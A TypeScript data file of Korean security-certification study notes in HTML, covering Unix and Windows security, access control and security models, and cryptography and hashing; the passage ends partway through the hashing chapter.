// 보안기사 챕터별 개념 콘텐츠 데이터
// content: prose 클래스 컨테이너 안에 렌더링되는 HTML

export type Chapter = {
  subject: string;       // URL slug (system, network, ...)
  subjectLabel: string;  // 표시명
  chapter: string;       // URL slug (access-control, ...)
  chapterLabel: string;  // 표시명
  content: string;       // HTML (prose 스타일 적용됨)
  keywords: string[];    // 기출문제 필터링용 키워드 (question 필드에 포함 여부)
};

export const CHAPTERS: Chapter[] = [

  // ===== 시스템보안 =====
  {
    subject: 'system',
    subjectLabel: '시스템보안',
    chapter: 'linux-security',
    chapterLabel: '유닉스·리눅스 보안',
    keywords: ['umask', '파일 권한', 'setuid', 'setgid', 'sticky bit', '/etc/passwd', '/etc/shadow', '계정', '패스워드', 'RUID', 'EUID', 'TCP Wrapper', 'sudoers', '로그'],
    content: `
<h3>파일 권한 (rwx)</h3>
<p>리눅스 파일 권한은 소유자(User)/그룹(Group)/기타(Other) 3계층, 각각 읽기(r=4)/쓰기(w=2)/실행(x=1) 3비트로 표현합니다.</p>
<pre><code>ls -l 출력 예시:
-rwxr-xr-- 1 alice staff 1024 May 1 12:00 script.sh
 ↑↑↑↑ ↑↑↑ ↑↑↑
 │소유자 │그룹 │기타
 rwx=7  r-x=5  r--=4  →  옥탈: 754</code></pre>

<h3>umask</h3>
<p>umask는 파일/디렉토리 생성 시 기본 권한에서 제거할 비트를 지정합니다.<br>
파일 기본권한 666, 디렉토리 기본권한 777에서 umask 값을 뺍니다.</p>
<table>
  <thead><tr><th>umask</th><th>파일 생성 권한</th><th>디렉토리 생성 권한</th><th>설명</th></tr></thead>
  <tbody>
    <tr><td>022</td><td>644 (rw-r--r--)</td><td>755 (rwxr-xr-x)</td><td>일반적 기본값</td></tr>
    <tr><td>027</td><td>640 (rw-r-----)</td><td>750 (rwxr-x---)</td><td>그룹까지만 읽기</td></tr>
    <tr><td>077</td><td>600 (rw-------)</td><td>700 (rwx------)</td><td>소유자만 접근</td></tr>
  </tbody>
</table>

<h3>특수 권한</h3>
<table>
  <thead><tr><th>이름</th><th>옥탈</th><th>파일 효과</th><th>디렉토리 효과</th><th>ls -l 표시</th></tr></thead>
  <tbody>
    <tr><td>SetUID (SUID)</td><td>4000</td><td>실행 시 파일 소유자 권한으로 실행</td><td>효과 없음</td><td>소유자 x 자리 → <code>s</code> (없으면 <code>S</code>)</td></tr>
    <tr><td>SetGID (SGID)</td><td>2000</td><td>실행 시 파일 그룹 권한으로 실행</td><td>하위 파일이 디렉토리 그룹 상속</td><td>그룹 x 자리 → <code>s</code></td></tr>
    <tr><td>Sticky Bit</td><td>1000</td><td>효과 없음(과거 메모리 고정)</td><td>자신의 파일만 삭제 가능 (예: /tmp)</td><td>기타 x 자리 → <code>t</code></td></tr>
  </tbody>
</table>
<h4>SetUID 보안 위험 및 점검</h4>
<pre><code># SetUID 파일 전체 검색
find / -perm -4000 -type f 2&gt;/dev/null

# 불필요한 SUID 제거
chmod u-s /경로/파일</code></pre>

<h3>/etc/passwd 필드 (7개)</h3>
<pre><code>root:x:0:0:root:/root:/bin/bash
 ①   ② ③ ④  ⑤   ⑥      ⑦
① 사용자명  ② 패스워드(x=shadow로 이동)  ③ UID
④ GID  ⑤ 코멘트(GECOS)  ⑥ 홈디렉토리  ⑦ 기본 셸</code></pre>

<h3>/etc/shadow 필드 및 해시 prefix</h3>
<pre><code>alice:$6$salt$hash:19000:0:99999:7:::
  ①      ②           ③   ④   ⑤  ⑥
① 사용자명  ② 해시(prefix+salt+해시값)  ③ 최근 변경일(epoch 기준 일수)
④ 최소변경기간  ⑤ 최대변경기간  ⑥ 만료 경고일수</code></pre>
<table>
  <thead><tr><th>Prefix</th><th>알고리즘</th><th>권장</th></tr></thead>
  <tbody>
    <tr><td>$1$</td><td>MD5</td><td>취약 — 사용 금지</td></tr>
    <tr><td>$5$</td><td>SHA-256</td><td>허용</td></tr>
    <tr><td>$6$</td><td>SHA-512</td><td>권장</td></tr>
    <tr><td>$2b$</td><td>bcrypt</td><td>권장</td></tr>
  </tbody>
</table>

<h3>/etc/login.defs 주요 설정</h3>
<table>
  <thead><tr><th>설정 키</th><th>설명</th></tr></thead>
  <tbody>
    <tr><td>PASS_MAX_DAYS</td><td>패스워드 최대 유효 기간 (일)</td></tr>
    <tr><td>PASS_MIN_DAYS</td><td>패스워드 최소 변경 금지 기간 (일)</td></tr>
    <tr><td>PASS_MIN_LEN</td><td>패스워드 최소 길이</td></tr>
    <tr><td>PASS_WARN_AGE</td><td>만료 전 경고 일수</td></tr>
    <tr><td>UID_MIN / UID_MAX</td><td>일반 사용자 UID 범위</td></tr>
  </tbody>
</table>

<h3>RUID / EUID / SUID 개념</h3>
<table>
  <thead><tr><th>식별자</th><th>의미</th><th>역할</th></tr></thead>
  <tbody>
    <tr><td>RUID (Real UID)</td><td>실제 사용자 ID</td><td>프로세스를 시작한 사용자</td></tr>
    <tr><td>EUID (Effective UID)</td><td>유효 사용자 ID</td><td>권한 검사에 실제 사용되는 ID (SetUID 시 소유자 UID로 전환)</td></tr>
    <tr><td>SUID (Saved UID)</td><td>저장된 사용자 ID</td><td>EUID 변경 전 값 저장 (나중에 복원 가능)</td></tr>
  </tbody>
</table>

<h3>주요 보안 파일</h3>
<table>
  <thead><tr><th>파일/디렉토리</th><th>역할</th></tr></thead>
  <tbody>
    <tr><td>/etc/passwd</td><td>사용자 계정 정보 (공개)</td></tr>
    <tr><td>/etc/shadow</td><td>패스워드 해시 (root만 접근)</td></tr>
    <tr><td>/etc/group</td><td>그룹 정보</td></tr>
    <tr><td>/etc/sudoers</td><td>sudo 권한 설정 (visudo로 편집)</td></tr>
    <tr><td>/etc/hosts.allow</td><td>TCP Wrapper 허용 규칙</td></tr>
    <tr><td>/etc/hosts.deny</td><td>TCP Wrapper 거부 규칙</td></tr>
    <tr><td>/var/log/auth.log</td><td>인증 관련 로그 (Debian계열)</td></tr>
    <tr><td>/var/log/secure</td><td>인증 관련 로그 (RedHat계열)</td></tr>
    <tr><td>/var/log/wtmp</td><td>로그인 이력 (last 명령으로 조회)</td></tr>
    <tr><td>/var/log/btmp</td><td>로그인 실패 이력 (lastb 명령)</td></tr>
  </tbody>
</table>

<h3>TCP Wrapper</h3>
<p>inetd/xinetd 기반 서비스에 대한 호스트 기반 접근통제. <strong>/etc/hosts.allow가 /etc/hosts.deny보다 먼저 확인</strong>되며, 허용 규칙이 있으면 즉시 허용합니다.</p>
<pre><code># /etc/hosts.allow (허용 우선)
sshd: 192.168.1.0/24

# /etc/hosts.deny (나머지 차단)
ALL: ALL</code></pre>
    `,
  },
  {
    subject: 'system',
    subjectLabel: '시스템보안',
    chapter: 'windows-security',
    chapterLabel: '윈도우 보안',
    keywords: ['SAM', '레지스트리', 'NTFS', 'DACL', 'SACL', '이벤트 로그', 'UAC', '계정 잠금', 'BitLocker', 'NTLM'],
    content: `
<h3>SAM 데이터베이스</h3>
<p>SAM(Security Account Manager)은 로컬 계정의 인증 정보를 저장하는 윈도우 데이터베이스입니다.</p>
<table>
  <thead><tr><th>항목</th><th>내용</th></tr></thead>
  <tbody>
    <tr><td>위치</td><td>%SystemRoot%\System32\config\SAM (레지스트리 HKLM\SAM)</td></tr>
    <tr><td>저장 형식</td><td>NTLM 해시 (MD4(패스워드))</td></tr>
    <tr><td>접근 제한</td><td>실행 중 OS는 잠금, SYSTEM 계정만 접근 가능</td></tr>
    <tr><td>공격 기법</td><td>Pass the Hash, SAM 덤프(fgdump, mimikatz)</td></tr>
  </tbody>
</table>

<h3>레지스트리 하이브</h3>
<table>
  <thead><tr><th>하이브</th><th>약어</th><th>역할</th></tr></thead>
  <tbody>
    <tr><td>HKEY_LOCAL_MACHINE</td><td>HKLM</td><td>시스템 전체 하드웨어·소프트웨어·보안 설정</td></tr>
    <tr><td>HKEY_CURRENT_USER</td><td>HKCU</td><td>현재 로그인 사용자 설정</td></tr>
    <tr><td>HKEY_USERS</td><td>HKU</td><td>모든 사용자 프로파일</td></tr>
    <tr><td>HKEY_CLASSES_ROOT</td><td>HKCR</td><td>파일 확장자 연결·COM 객체 등록</td></tr>
    <tr><td>HKEY_CURRENT_CONFIG</td><td>HKCC</td><td>현재 하드웨어 프로파일</td></tr>
  </tbody>
</table>

<h4>주요 보안 관련 레지스트리 키</h4>
<table>
  <thead><tr><th>레지스트리 키</th><th>설명</th></tr></thead>
  <tbody>
    <tr><td>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</td><td>시스템 부팅 시 자동 실행 프로그램</td></tr>
    <tr><td>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</td><td>사용자 로그온 시 자동 실행</td></tr>
    <tr><td>HKLM\SAM\SAM</td><td>계정 해시 저장 (SYSTEM 전용)</td></tr>
    <tr><td>HKLM\SYSTEM\CurrentControlSet\Services</td><td>서비스 설정 (악성코드 지속성 확보)</td></tr>
  </tbody>
</table>

<h3>NTFS 권한 (DACL / SACL)</h3>
<table>
  <thead><tr><th>구분</th><th>DACL (Discretionary ACL)</th><th>SACL (System ACL)</th></tr></thead>
  <tbody>
    <tr><td>목적</td><td>접근 허용/거부 제어</td><td>감사(Audit) 로그 기록 제어</td></tr>
    <tr><td>설정 주체</td><td>객체 소유자</td><td>관리자(SeSecurityPrivilege 필요)</td></tr>
    <tr><td>ACE 구성</td><td>Allow ACE / Deny ACE</td><td>Audit ACE (성공/실패 기록)</td></tr>
  </tbody>
</table>
<p><strong>ACE 평가 순서:</strong> Deny ACE가 Allow ACE보다 항상 우선 적용됩니다.</p>

<h3>주요 보안 이벤트 ID</h3>
<table>
  <thead><tr><th>이벤트 ID</th><th>설명</th></tr></thead>
  <tbody>
    <tr><td>4624</td><td>로그온 성공</td></tr>
    <tr><td>4625</td><td>로그온 실패</td></tr>
    <tr><td>4648</td><td>명시적 자격 증명으로 로그온 시도 (runas 등)</td></tr>
    <tr><td>4720</td><td>사용자 계정 생성</td></tr>
    <tr><td>4722</td><td>사용자 계정 활성화</td></tr>
    <tr><td>4728</td><td>보안 그룹에 멤버 추가</td></tr>
    <tr><td>4732</td><td>로컬 보안 그룹에 멤버 추가</td></tr>
    <tr><td>4740</td><td>계정 잠금</td></tr>
    <tr><td>4776</td><td>NTLM 자격 증명 검증 시도</td></tr>
    <tr><td>7045</td><td>새 서비스 설치 (악성코드 지속성)</td></tr>
  </tbody>
</table>

<h3>계정 정책</h3>
<ul>
  <li><strong>잠금 임계값</strong>: 로그온 실패 N회 후 계정 잠금 (권장: 5회 이하)</li>
  <li><strong>잠금 기간</strong>: 자동 해제까지의 대기 시간 (권장: 30분 이상)</li>
  <li><strong>패스워드 복잡성</strong>: 대문자/소문자/숫자/특수문자 조합, 최소 8자 이상</li>
  <li><strong>패스워드 이력</strong>: 이전 N개 패스워드 재사용 금지</li>
</ul>

<h3>UAC (User Account Control)</h3>
<p>관리자 계정으로 로그인해도 일반 권한으로 작업하고, 관리자 권한이 필요한 작업 시 사용자 동의를 요청하는 기능입니다.</p>
<ul>
  <li>목적: 악성코드의 무단 권한 상승 방지</li>
  <li>동작: 관리자 권한 필요 시 동의(Consent) 또는 자격증명(Credential) 프롬프트 표시</li>
  <li>레지스트리: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System</li>
</ul>

<h3>Windows 보안 도구</h3>
<table>
  <thead><tr><th>도구</th><th>실행 명령</th><th>역할</th></tr></thead>
  <tbody>
    <tr><td>레지스트리 편집기</td><td>regedit</td><td>레지스트리 조회·수정</td></tr>
    <tr><td>이벤트 뷰어</td><td>eventvwr.msc</td><td>보안/시스템/응용 프로그램 로그 조회</td></tr>
    <tr><td>로컬 보안 정책</td><td>secpol.msc</td><td>계정 정책, 감사 정책, 사용자 권한 설정</td></tr>
    <tr><td>BitLocker</td><td>제어판 &gt; BitLocker</td><td>드라이브 전체 암호화 (TPM 활용)</td></tr>
  </tbody>
</table>
    `,
  },
  {
    subject: 'system',
    subjectLabel: '시스템보안',
    chapter: 'access-control',
    chapterLabel: '접근통제',
    keywords: ['DAC', 'MAC', 'RBAC', 'ABAC', '식별', '인증', '인가', 'MFA', '지식기반', '소지기반', '특성기반', 'SSO', '최소권한', '직무분리'],
    content: `
<h3>접근통제 3단계</h3>
<table>
  <thead><tr><th>단계</th><th>설명</th><th>예시</th></tr></thead>
  <tbody>
    <tr><td><strong>식별(Identification)</strong></td><td>시스템에 자신을 알림</td><td>사용자명 입력</td></tr>
    <tr><td><strong>인증(Authentication)</strong></td><td>주장한 신원을 증명</td><td>패스워드, OTP, 생체인식</td></tr>
    <tr><td><strong>인가(Authorization)</strong></td><td>인증된 주체에게 자원 접근 권한 부여</td><td>ACL, 역할 기반 권한</td></tr>
  </tbody>
</table>

<h3>인증 요소 (Authentication Factor)</h3>
<table>
  <thead><tr><th>유형</th><th>설명</th><th>예시</th></tr></thead>
  <tbody>
    <tr><td>지식 기반 (Something you know)</td><td>알고 있는 것</td><td>패스워드, PIN, 보안 질문</td></tr>
    <tr><td>소지 기반 (Something you have)</td><td>가지고 있는 것</td><td>OTP 토큰, 스마트카드, 인증서</td></tr>
    <tr><td>특성 기반 (Something you are)</td><td>자신의 특성</td><td>지문, 홍채, 얼굴, 정맥</td></tr>
    <tr><td>MFA (다단계 인증)</td><td>2가지 이상 요소 조합</td><td>패스워드 + OTP</td></tr>
  </tbody>
</table>

<h3>접근통제 정책 유형 비교</h3>
<table>
  <thead><tr><th>구분</th><th>권한 결정 주체</th><th>기반</th><th>특징</th><th>예시</th></tr></thead>
  <tbody>
    <tr>
      <td><strong>DAC</strong><br>(임의적 접근통제)</td>
      <td>데이터 소유자</td>
      <td>신분(Identity)</td>
      <td>유연하나 트로이목마 취약. 소유자가 자유롭게 권한 부여.</td>
      <td>유닉스 파일 권한, Windows NTFS</td>
    </tr>
    <tr>
      <td><strong>MAC</strong><br>(강제적 접근통제)</td>
      <td>시스템/관리자</td>
      <td>보안 레이블</td>
      <td>강력하나 유연성 낮음. 군사·정부 환경. 사용자가 권한 변경 불가.</td>
      <td>SELinux, 기밀/비밀/대외비/일반</td>
    </tr>
    <tr>
      <td><strong>RBAC</strong><br>(역할기반 접근통제)</td>
      <td>관리자</td>
      <td>역할(Role)</td>
      <td>역할에 권한 부여 후 사용자를 역할에 할당. 대규모 조직에 적합.</td>
      <td>직급별 ERP 권한</td>
    </tr>
    <tr>
      <td><strong>ABAC</strong><br>(속성기반 접근통제)</td>
      <td>정책 엔진</td>
      <td>속성 조합</td>
      <td>사용자·자원·환경 속성 조합으로 세밀한 정책. XACML 표준.</td>
      <td>근무시간+부서+보안등급 조합</td>
    </tr>
  </tbody>
</table>

<h3>접근 제어 행렬 (Access Control Matrix)</h3>
<p>주체(Subject)와 객체(Object)의 권한 관계를 행렬로 표현. 행: 주체, 열: 객체, 셀: 권한.</p>
<ul>
  <li><strong>ACL (Access Control List)</strong>: 열(객체) 기준으로 접근 가능한 주체 목록</li>
  <li><strong>Capability List</strong>: 행(주체) 기준으로 접근 가능한 객체 목록</li>
</ul>

<h3>접근통제 원칙</h3>
<ul>
  <li><strong>최소권한(Least Privilege)</strong>: 업무 수행에 필요한 최소한의 권한만 부여</li>
  <li><strong>직무분리(Separation of Duties)</strong>: 한 사람이 중요 프로세스 전체를 통제 불가. 내부 사기 방지</li>
  <li><strong>알 필요성(Need-to-Know)</strong>: 업무 수행에 반드시 필요한 정보만 접근 허용</li>
  <li><strong>기본 거부(Default Deny)</strong>: 명시적으로 허용되지 않은 것은 모두 거부</li>
</ul>

<h3>SSO 및 연동 프로토콜 비교</h3>
<table>
  <thead><tr><th>프로토콜</th><th>목적</th><th>특징</th></tr></thead>
  <tbody>
    <tr><td>Kerberos</td><td>인증</td><td>티켓 기반. KDC(AS+TGS). 대칭키. 시간 동기화 필수(5분)</td></tr>
    <tr><td>SAML</td><td>인증+인가</td><td>XML 기반. IdP ↔ SP. 엔터프라이즈 SSO</td></tr>
    <tr><td>OAuth 2.0</td><td>인가(Authorization)</td><td>액세스 토큰 발급. API 위임 접근</td></tr>
    <tr><td>OpenID Connect</td><td>인증</td><td>OAuth 2.0 기반 + ID 토큰(JWT)</td></tr>
  </tbody>
</table>
    `,
  },
  {
    subject: 'system',
    subjectLabel: '시스템보안',
    chapter: 'security-model',
    chapterLabel: '보안 모델',
    keywords: ['Bell-LaPadula', 'Biba', 'Clark-Wilson', 'Chinese Wall', 'Brewer-Nash', '참조모니터', 'TCB', '보안커널', '격자모델', 'ss속성', '스타속성'],
    content: `
<h3>Bell-LaPadula 모델 (기밀성)</h3>
<p>군사 기밀 보호 목적. MAC 기반. <strong>"Read Down, Write Up"만 허용.</strong></p>
<table>
  <thead><tr><th>속성</th><th>규칙</th><th>의미</th></tr></thead>
  <tbody>
    <tr><td>ss-속성 (단순 보안 속성)</td><td>No Read Up</td><td>자신보다 높은 등급 객체 읽기 금지</td></tr>
    <tr><td>*-속성 (스타 속성)</td><td>No Write Down</td><td>자신보다 낮은 등급 객체 쓰기 금지 (정보 유출 방지)</td></tr>
    <tr><td>ds-속성 (임의 보안 속성)</td><td>DAC 규칙 적용</td><td>접근통제 행렬로 추가 제한</td></tr>
  </tbody>
</table>
<p>단점: 무결성 보장 안 됨 (낮은 등급 사용자가 높은 등급에 쓸 수 있음)</p>

<h3>Biba 모델 (무결성)</h3>
<p>Bell-LaPadula와 반대 방향. <strong>"Read Up, Write Down"만 허용.</strong></p>
<table>
  <thead><tr><th>속성</th><th>규칙</th><th>의미</th></tr></thead>
  <tbody>
    <tr><td>단순 무결성 속성</td><td>No Read Down</td><td>낮은 등급 객체 읽기 금지 (오염 방지)</td></tr>
    <tr><td>*-무결성 속성</td><td>No Write Up</td><td>높은 등급 객체 쓰기 금지</td></tr>
  </tbody>
</table>
<p>단점: 기밀성 보장 안 됨</p>

<h3>Bell-LaPadula vs Biba 비교</h3>
<table>
  <thead><tr><th>구분</th><th>Bell-LaPadula</th><th>Biba</th></tr></thead>
  <tbody>
    <tr><td>보호 목표</td><td>기밀성(Confidentiality)</td><td>무결성(Integrity)</td></tr>
    <tr><td>읽기 규칙</td><td>No Read Up (상위 읽기 금지)</td><td>No Read Down (하위 읽기 금지)</td></tr>
    <tr><td>쓰기 규칙</td><td>No Write Down (하위 쓰기 금지)</td><td>No Write Up (상위 쓰기 금지)</td></tr>
    <tr><td>허용 방향</td><td>Read Down, Write Up</td><td>Read Up, Write Down</td></tr>
    <tr><td>적용 환경</td><td>군사·정부</td><td>상업적 무결성</td></tr>
  </tbody>
</table>

<h3>Clark-Wilson 모델 (상업적 무결성)</h3>
<p>상업 환경 무결성 보장. 3가지 목표: 인가된 사용자의 부정 조작 방지 / 직무 분리 / 트랜잭션 로깅.</p>
<table>
  <thead><tr><th>구성 요소</th><th>의미</th></tr></thead>
  <tbody>
    <tr><td>CDI (Constrained Data Item)</td><td>무결성 통제가 적용되는 데이터</td></tr>
    <tr><td>UDI (Unconstrained Data Item)</td><td>통제 없는 입력 데이터 (외부 입력)</td></tr>
    <tr><td>TP (Transformation Procedure)</td><td>CDI를 변환하는 유일한 프로그램</td></tr>
    <tr><td>IVP (Integrity Verification Procedure)</td><td>CDI 무결성 검증 절차</td></tr>
  </tbody>
</table>

<h3>Chinese Wall 모델 (Brewer-Nash)</h3>
<p>이해충돌(Conflict of Interest) 방지. 컨설팅·금융 환경.</p>
<ul>
  <li>한 번 A사 정보 접근 시 경쟁사 B사 정보 접근 자동 차단</li>
  <li>시간이 지남에 따라 접근 가능 객체가 동적으로 변함 (DAC+MAC 혼합 특성)</li>
</ul>

<h3>기타 보안 모델</h3>
<table>
  <thead><tr><th>모델</th><th>특징</th></tr></thead>
  <tbody>
    <tr><td>HRU (Harrison-Ruzzo-Ullman)</td><td>접근 행렬 기반. 권한 변경 연산 정의. 안전성 결정 불가(비결정적)</td></tr>
    <tr><td>Take-Grant</td><td>권한 전달(Grant)·가져오기(Take) 연산으로 권한 흐름 분석</td></tr>
    <tr><td>격자 모델(Lattice)</td><td>보안 레벨 간 편순서 관계. Bell-LaPadula의 수학적 기반</td></tr>
  </tbody>
</table>

<h3>참조 모니터 (Reference Monitor)</h3>
<p>모든 접근 요청을 중재하는 추상적 개념. 3가지 필수 요건:</p>
<ul>
  <li><strong>격리성(Isolation)</strong>: 변조·우회 불가하게 격리</li>
  <li><strong>완전성(Completeness)</strong>: 모든 접근 요청 반드시 통과</li>
  <li><strong>검증가능성(Verifiability)</strong>: 정확성 검증·테스트 가능</li>
</ul>
<p>구현체: <strong>보안 커널(Security Kernel)</strong>. TCB(Trusted Computing Base)의 핵심 구성 요소.</p>
<p><strong>TCB</strong>: 시스템 보안 정책을 강제하는 하드웨어·소프트웨어·펌웨어의 집합. 보안 커널 + 보안 관련 프로세스.</p>
    `,
  },

  {
    subject: 'system',
    subjectLabel: '시스템보안',
    chapter: 'symmetric-crypto',
    chapterLabel: '대칭키 암호화',
    keywords: ['DES', 'AES', 'ARIA', 'SEED', 'LEA', '3DES', 'ECB', 'CBC', 'CTR', 'GCM', 'RC4', 'AEAD', '블록암호', '스트림암호'],
    content: `
<h3>암호화 유형 간단 비교</h3>
<table>
  <thead><tr><th>구분</th><th>대칭키</th><th>비대칭키</th><th>해시</th></tr></thead>
  <tbody>
    <tr><td>키</td><td>암·복호화 동일 키</td><td>공개키/개인키 쌍</td><td>키 없음 (단방향)</td></tr>
    <tr><td>속도</td><td>빠름</td><td>매우 느림</td><td>매우 빠름</td></tr>
    <tr><td>키 수(n명)</td><td>n(n-1)/2</td><td>2n</td><td>해당 없음</td></tr>
    <tr><td>주요 용도</td><td>대용량 데이터 암호화</td><td>키 교환, 디지털 서명</td><td>무결성 검증, 패스워드</td></tr>
  </tbody>
</table>

<h3>블록 암호 vs 스트림 암호</h3>
<table>
  <thead><tr><th>구분</th><th>블록 암호</th><th>스트림 암호</th></tr></thead>
  <tbody>
    <tr><td>처리 단위</td><td>고정 크기 블록 (64/128bit)</td><td>1비트 또는 1바이트씩</td></tr>
    <tr><td>패딩</td><td>필요 (블록 크기 맞춤)</td><td>불필요</td></tr>
    <tr><td>속도</td><td>상대적으로 느림</td><td>빠름</td></tr>
    <tr><td>대표</td><td>DES, AES, ARIA, SEED</td><td>RC4, A5/1, ChaCha20</td></tr>
  </tbody>
</table>

<h3>주요 블록 암호 알고리즘</h3>
<table>
  <thead><tr><th>알고리즘</th><th>키 길이</th><th>블록 크기</th><th>특징</th></tr></thead>
  <tbody>
    <tr><td><strong>DES</strong></td><td>56bit</td><td>64bit</td><td>1977년 미국 표준. 현재 안전하지 않음. 전사적 공격 가능.</td></tr>
    <tr><td><strong>3DES</strong></td><td>168bit (실효 112bit)</td><td>64bit</td><td>EDE 방식. 느림. 레거시 호환.</td></tr>
    <tr><td><strong>AES</strong></td><td>128/192/256bit</td><td>128bit</td><td>2001년 미국 표준(FIPS 197). Rijndael. 현재 가장 널리 사용.</td></tr>
    <tr><td><strong>ARIA</strong></td><td>128/192/256bit</td><td>128bit</td><td>국내 표준(KS X 1213). 국정원 개발.</td></tr>
    <tr><td><strong>SEED</strong></td><td>128/256bit</td><td>128bit</td><td>국내 표준(KS X 1005). KISA 개발. 전자금융.</td></tr>
    <tr><td><strong>LEA</strong></td><td>128/192/256bit</td><td>128bit</td><td>경량 암호화. IoT 환경. 국내 표준.</td></tr>
  </tbody>
</table>

<h3>블록 암호 운용 모드</h3>
<table>
  <thead><tr><th>모드</th><th>패딩</th><th>병렬처리</th><th>특징</th><th>용도</th></tr></thead>
  <tbody>
    <tr><td><strong>ECB</strong></td><td>필요</td><td>가능</td><td>블록 독립 암호화. 같은 평문→같은 암호문. 패턴 노출. 사용 금지.</td><td>사용 금지</td></tr>
    <tr><td><strong>CBC</strong></td><td>필요</td><td>복호화만</td><td>이전 암호문 블록과 XOR. IV 필요. 오류 전파.</td><td>파일 암호화</td></tr>
    <tr><td><strong>CFB</strong></td><td>불필요</td><td>복호화만</td><td>스트림 암호처럼 동작. IV 필요.</td><td>스트림 데이터</td></tr>
    <tr><td><strong>OFB</strong></td><td>불필요</td><td>불가</td><td>키 스트림 사전 생성. 오류 비전파.</td><td>위성통신</td></tr>
    <tr><td><strong>CTR</strong></td><td>불필요</td><td>가능</td><td>카운터 값 암호화 후 XOR. 완전 병렬.</td><td>고성능</td></tr>
    <tr><td><strong>GCM</strong></td><td>불필요</td><td>가능</td><td>CTR + GHASH 인증. AEAD. 인증 태그 생성.</td><td>TLS 1.3</td></tr>
  </tbody>
</table>

<h3>AEAD 및 스트림 암호</h3>
<p><strong>AEAD (Authenticated Encryption with Associated Data)</strong>: 암호화 + 인증을 동시 제공. GCM, CCM, ChaCha20-Poly1305.</p>
<p><strong>RC4</strong>: SSL/WEP에 사용됐으나 편향성 취약점 발견. 현재 사용 금지.</p>
    `,
  },
  {
    subject: 'system',
    subjectLabel: '시스템보안',
    chapter: 'asymmetric-crypto',
    chapterLabel: '비대칭키 암호화',
    keywords: ['RSA', 'ECC', 'Diffie-Hellman', 'ElGamal', 'DSA', '소인수분해', '이산로그', '타원곡선', '하이브리드', '공개키', '개인키'],
    content: `
<h3>비대칭키 기본 원리</h3>
<ul>
  <li><strong>암호화</strong>: 수신자의 공개키로 암호화 → 수신자의 개인키로 복호화</li>
  <li><strong>디지털 서명</strong>: 송신자의 개인키로 서명 → 수신자가 공개키로 검증</li>
</ul>

<h3>주요 비대칭키 알고리즘</h3>
<table>
  <thead><tr><th>알고리즘</th><th>수학적 기반</th><th>권장 키 길이</th><th>용도</th></tr></thead>
  <tbody>
    <tr><td><strong>RSA</strong></td><td>소인수분해의 어려움</td><td>2048bit 이상</td><td>암호화, 디지털 서명</td></tr>
    <tr><td><strong>ECC</strong></td><td>타원곡선 이산로그 문제</td><td>256bit</td><td>모바일/IoT (짧은 키로 동등 보안)</td></tr>
    <tr><td><strong>Diffie-Hellman (DH)</strong></td><td>이산로그 문제</td><td>2048bit 이상</td><td>키 교환 전용 (암호화·서명 불가)</td></tr>
    <tr><td><strong>ElGamal</strong></td><td>이산로그 문제</td><td>1024bit 이상</td><td>암호화, 서명</td></tr>
    <tr><td><strong>DSA</strong></td><td>이산로그 문제</td><td>1024~3072bit</td><td>디지털 서명 전용</td></tr>
  </tbody>
</table>

<h3>RSA 원리</h3>
<p>두 큰 소수 p, q의 곱 n=p×q에서, n만 알고서 p, q를 소인수분해하기 어렵다는 수학적 난제를 기반으로 합니다.</p>
<ul>
  <li>키 길이: 현재 2048bit 이상 권장 (1024bit 이하 취약)</li>
  <li>RSA 2048bit ≈ ECC 224bit ≈ AES 112bit (동등 보안강도)</li>
</ul>

<h3>ECC 특징</h3>
<p>타원곡선 위의 점 덧셈 연산을 기반으로 하는 암호화. RSA보다 짧은 키로 동등한 보안강도를 제공합니다.</p>
<table>
  <thead><tr><th>ECC 키 길이</th><th>동등 RSA 키 길이</th></tr></thead>
  <tbody>
    <tr><td>256bit</td><td>3072bit</td></tr>
    <tr><td>384bit</td><td>7680bit</td></tr>
    <tr><td>521bit</td><td>15360bit</td></tr>
  </tbody>
</table>

<h3>Diffie-Hellman 키 교환</h3>
<p>공개 채널에서 안전하게 공유 비밀키 생성. <strong>인증 기능 없음</strong> → 중간자 공격(MITM) 취약.</p>
<ul>
  <li><strong>DHE (임시 DH)</strong>: 매 세션마다 임시 키 생성 → PFS(Perfect Forward Secrecy) 제공</li>
  <li><strong>ECDHE</strong>: ECC 기반 DHE. TLS 1.3의 기본 키 교환 방식</li>
</ul>

<h3>하이브리드 암호화</h3>
<p>대칭키(빠른 속도)와 비대칭키(안전한 키 교환)를 결합하는 방식. HTTPS/TLS에서 사용.</p>
<pre><code>1. 세션 키(대칭키) 생성
2. 세션 키를 수신자의 공개키로 암호화 → 전송
3. 실제 데이터는 세션 키(대칭키)로 암호화 → 전송
4. 수신자: 개인키로 세션 키 복호화 → 세션 키로 데이터 복호화</code></pre>

<h3>키 관리 비교</h3>
<table>
  <thead><tr><th>구분</th><th>n명 간 필요 키 수</th></tr></thead>
  <tbody>
    <tr><td>대칭키 (1:1 비밀키)</td><td>n(n-1)/2</td></tr>
    <tr><td>비대칭키 (공개키+개인키 쌍)</td><td>2n</td></tr>
  </tbody>
</table>
    `,
  },
  {
    subject: 'system',
    subjectLabel: '시스템보안',
    chapter: 'hash-mac',
    chapterLabel: '해시·메시지 인증',
    keywords: ['MD5', 'SHA-1', 'SHA-256', 'SHA-3', 'HMAC', 'HAS-160', '충돌', '역상', '솔트', '레인보우테이블', 'bcrypt', 'PBKDF2'],
    content: `
<h3>해시 함수 4가지 특성</h3>
<table>
  <thead><tr><th>특성</th><th>설명</th></tr></thead>
  <tbody>
    <tr><td><strong>일방향성(One-way)</strong></td><td>해시값으로 원문 복원 불가 (역산 불가)</td></tr>
    <tr><td><strong>역상 저항성(Preimage resistance)</strong></td><td>주어진 해시값 h에 대해 H(m)=h인 m 찾기 어려움</td></tr>
    <tr><td><strong>제2역상 저항성(Second preimage resistance)</strong></td><td>주어진 m1에 대해 H(m1)=H(m2)인 m2 찾기 어려움</td></tr>
    <tr><td><strong>충돌 저항성(Collision resistance)</strong></td><td>H(m1)=H(m2)인 임의의 m1≠m2 쌍 찾기 어려움</td></tr>
  </tbody>
</table>

<h3>주요 해시 알고리즘</h3>
<table>
  <thead><tr><th>알고리즘</th><th>출력 길이</th><th>상태</th></tr></thead>
  <tbody>
    <tr><td><strong>MD5</strong></td><td>128bit</td><td>충돌 공격 가능. 무결성 검증 부적합. 사용 지양.</td></tr>
    <tr><td><strong>SHA-1</strong></td><td>160bit</td><td>2017년 충돌 공격 성공(SHAttered). 사용 금지 권고.</td></tr>
    <tr><td><strong>SHA-224/256</strong></td><td>224/256bit</td><td>SHA-2 계열. 현재 표준. 가장 널리 사용.</td></tr>
